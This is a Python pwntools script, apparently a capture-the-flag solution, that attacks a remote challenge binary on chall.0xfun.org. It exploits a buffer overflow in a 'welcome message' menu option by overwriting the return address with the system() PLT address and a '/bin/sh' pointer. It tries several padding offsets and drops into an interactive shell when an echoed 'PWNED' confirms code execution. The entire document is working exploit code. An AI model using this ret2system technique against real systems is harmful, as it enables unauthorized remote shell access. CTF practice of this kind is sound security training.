from pwn import *

context.log_level = 'info'

def attempt_exploit(offset):
    try:
        # r = process('./vuln')
        r = remote('chall.0xfun.org', 47074)
        
        elf = ELF('./vuln', checksec=False)
        
        r.recvuntil(b'> ')
        r.sendline(b'1')
        r.recvuntil(b'Food currently in fridge:')
        
        r.recvuntil(b'> ')
        r.sendline(b'2')
        r.recvuntil(b'New welcome message (up to 32 chars):\n')
        
        system_addr = elf.plt['system']
        try:
            bin_sh_addr = next(elf.search(b'/bin/sh'))
        except StopIteration:
            bin_sh_addr = next(elf.search(b'sh\x00'))

        log.info(f"Testing Offset: {offset}")
        
        payload = b'A' * offset
        payload += p32(system_addr)
        payload += p32(0xdeadbeef) 
        payload += p32(bin_sh_addr)
        
        r.sendline(payload)
        
        r.sendline(b'echo PWNED')
        
        response = r.recvline(timeout=2)
        
        if b'PWNED' in response:
            log.success(f"!!! SHELL RECEIVED AT THE OFFICE {offset} !!!")
            r.interactive()
            return True
        else:
            r.close()
            return False
            
    except EOFError:
        r.close()
        return False
    except Exception as e:
        log.warning(f"Error: {e}")
        r.close()
        return False

for off in [36, 40, 44, 48, 52]:
    if attempt_exploit(off):
        break
else:
    log.error("error")